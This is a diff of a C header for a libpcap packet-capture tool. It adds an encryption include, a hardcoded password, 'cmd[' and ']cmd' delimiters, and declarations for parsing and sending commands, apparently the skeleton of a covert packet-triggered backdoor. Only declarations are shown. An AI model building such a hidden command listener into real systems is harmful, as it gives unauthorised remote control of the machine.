@@ -2,13 +2,16 @@
 #define PKTCAP_H
 
 #include "utils.h"
+#include "lib/isaac_encryption.h"
 
-#define NETWORK_INT "em1"
-
-#define PKT_SIZE 1518
-#define BUFFER 100
-#define SIZE_ETHERNET 14
-#define ETHER_ADDR_LEN	6
+#define NETWORK_INT 		"em1"
+#define PASSWORD 		"uest1onQ?"
+#define PKT_SIZE 		1518
+#define BUFFER 			100
+#define SIZE_ETHERNET 		14
+#define ETHERNET_ADDR_LEN	6
+#define CMD_START 		"cmd["
+#define CMD_END 		"]cmd"
 
 /* IP header */
 struct ip_struct {
@@ -57,5 +60,8 @@ struct tcp_struct {
 
 int startPacketCapture(pcap_t * nic_descr, struct bpf_program fp, int port);
 int stopPacketCapture(pcap_t * nic_descr, struct bpf_program fp);
+void pkt_callback(u_char *ptr_null, const struct pcap_pkthdr* pkt_header, const u_char* packet);
+char * parse_cmd(char * command);
+void send_command(char * command);
 
 #endif
